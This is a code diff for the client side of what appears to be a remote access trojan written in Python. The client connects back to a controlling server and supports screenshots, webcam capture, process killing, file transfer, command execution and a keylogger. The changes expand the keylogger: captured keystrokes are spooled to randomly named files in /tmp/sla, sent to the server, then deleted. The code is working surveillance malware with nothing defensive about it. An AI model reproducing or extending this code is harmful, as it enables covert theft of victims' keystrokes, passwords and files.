@@ -1,7 +1,7 @@
 # coding: utf-8
 
 __author__ = '@zNairy'
-__contact__ = 'Discord: __Nairy__#7181 | Github: https://github.com/zNairy/'
+__contact__ = 'Discord: zNairy#7181 | Github: https://github.com/zNairy/'
 __version__ = '2.0'
 
 from socket import socket, AF_INET, SOCK_STREAM
@@ -11,6 +11,7 @@ from pyscreenshot import grab
 from cv2 import VideoCapture, imencode
 from psutil import process_iter, AccessDenied
 from pynput.keyboard import Listener, KeyCode
+from random import getrandbits
 from pathlib import Path
 from json import loads as jloads
 from pickle import loads, dumps
@@ -28,8 +29,8 @@ class Client(object):
     def __init__(self, host='0.0.0.0', port=5000):
         self.__Address = (host, port)
         self.screenshotPath = '/tmp/736f6e61726973.png' if uname().sysname.lower() == 'linux' else f'C:/Users/{getuser()}/AppData/Local/Temp/736f6e61726973.png'
-        self.kloggerIsRunning = False
-        self.kloggerKeys = ''
+        self.kloggerIsRunning, self.currentCapturedKeys = False, ''
+        self.kloggerFiles = []
 
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
@@ -49,7 +50,7 @@ class Client(object):
             try:
                 for process in processes:
                     process.terminate()
-                
+
                 self.sendHeader({"content": f"[green]Process [yellow]{processIdentifier} [green]has been terminated!"})
             except AccessDenied:
                 self.sendHeader({"content": f"[red]Error: Can't terminate process [yellow]{processIdentifier}, [red]Access denied"})
@@ -75,44 +76,79 @@ class Client(object):
         sleep(0.5)
         self.__Client.send(dumps(processesInfo))
 
+    # removing temp log files
+    def removeKloogerFiles(self):
+        for klog in self.kloggerFiles:
+            Path(f'/tmp/sla/{klog}.dat').unlink(missing_ok=True)
+        
+        self.kloggerFiles.clear()
+
+    def saveCapturedKeys(self):
+        # generating random name to file
+        nameFile = hex(getrandbits(128))[2:-1]
+        self.kloggerFiles.append(nameFile)
+
+        with open(f'/tmp/sla/{nameFile}.dat', 'w') as partFile:
+            partFile.write(f'[{datetime.now().strftime("%H:%M")}]: {self.currentCapturedKeys}')
+
+        self.currentCapturedKeys = ''
+
+    # excluding command/special keys
     def checkValidKeys(self, key):
         if isinstance(key, KeyCode):
-            self.kloggerKeys += key.char
+            self.currentCapturedKeys += key.char
         elif key.name == 'space':
-            self.kloggerKeys += ' '
+            self.currentCapturedKeys += ' '
 
+        if len(self.currentCapturedKeys) >= 1000000: # ≃1mb
+            self.saveCapturedKeys()
+
+    # starting the keyboard logger
     def keyloggerStart(self, args):
         if not self.kloggerIsRunning:
-            self.listener = Listener(on_press=self.checkValidKeys)
-            self.listener.start()
+            self.keyboardListener = Listener(on_press=self.checkValidKeys)
+            self.keyboardListener.start()
             self.kloggerIsRunning = True
             self.sendHeader({"content": f"[green]The listening started at [yellow]{datetime.now().strftime('%H:%M')}!\n"})
         else:
-            self.sendHeader({"content": f"[red]The klogger is already running!"})
+            self.sendHeader({"content": f"[yellow]The klogger is already running!"})
 
+    # sending the captured keys to server side
     def keyloggerDump(self, args):
         if self.kloggerIsRunning:
+            if self.kloggerFiles:
+                currentKeys, self.currentCapturedKeys = f"[{datetime.now().strftime('%H:%M')}]: {self.currentCapturedKeys}", "" # saving current content of captured keys and erasing them
+                klogs = ''.join(open(f'/tmp/sla/{partFile}.dat').read() + '\n' for partFile in self.kloggerFiles)
+                self.removeKloogerFiles()
+                capturedKeys = (klogs+currentKeys).encode()
+            elif self.currentCapturedKeys:
+                capturedKeys, self.currentCapturedKeys = f"[{datetime.now().strftime('%H:%M')}]: {self.currentCapturedKeys}".encode(), "" # saving current content of captured keys and erasing them
+            else:
+                self.sendHeader({"sucess": False, "content": "[red] There's no captured keys yet."})
+                return
+
             header = {
                 "namefile": f"klogger_dump-{datetime.now().strftime('%d.%m.%y-%H.%M.%S')}",
-                "extension": '.txt',
-                "bytes": len(self.kloggerKeys.encode()),
+                "extension": '.dat',
+                "bytes": len(capturedKeys),
                 "path": "files",
                 "sucess": True
             }
-
+            
             self.sendHeader(header)
             sleep(0.5)
-            self.__Client.send(self.kloggerKeys.encode())
+            self.__Client.send(capturedKeys)
         else:
             self.sendHeader({"sucess": False, "content": "[red] Error: The klogger is not running!"})
 
+    # stopping the keyboard logger
     def keyloggerStop(self, args):
         if self.kloggerIsRunning:
-            self.listener.stop()
+            self.keyboardListener.stop()
             self.kloggerIsRunning = False
-            self.sendHeader({"content": f"[green]Klogger has ended at [yellow]{datetime.now().strftime('%H:%M')}!\n"})
+            self.sendHeader({"content": f"[green]Klogger has ended at [yellow]{datetime.now().strftime('%H:%M')}!"})
         else:
-            self.sendHeader({"content": "[red] Error: Klogger is not running."})
+            self.sendHeader({"content": "[red] Error: The Klogger is not running."})
 
     # receiving a file from server side (upload)
     def upload(self, args):
@@ -120,7 +156,6 @@ class Client(object):
         try:
             self.receiveFile(header)
             self.sendHeader({"content": f"File {Path(args).stem} uploaded successfully!", "sucess": True})
-
         except PermissionError:
             self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})
 
@@ -199,7 +234,6 @@ class Client(object):
                 self.__Client.send(file)
             else:
                 self.sendHeader({"content": f"File {Path(args).stem} not found", "sucess": False})
-
         except PermissionError:
             self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})
 
@@ -231,7 +265,6 @@ class Client(object):
         try:
             chdir(directory)
             self.sendCommand(self.lastCommand, '.')
-        
         except PermissionError:
             self.sendCommand(self.lastCommand)
         except FileNotFoundError:
@@ -317,7 +350,6 @@ class Client(object):
         try:
             self.__Client.connect((self.__Address))
             self.__Client.send(self.identifier())
-            
         except ConnectionRefusedError:
             sleep(5);self.connect()
 
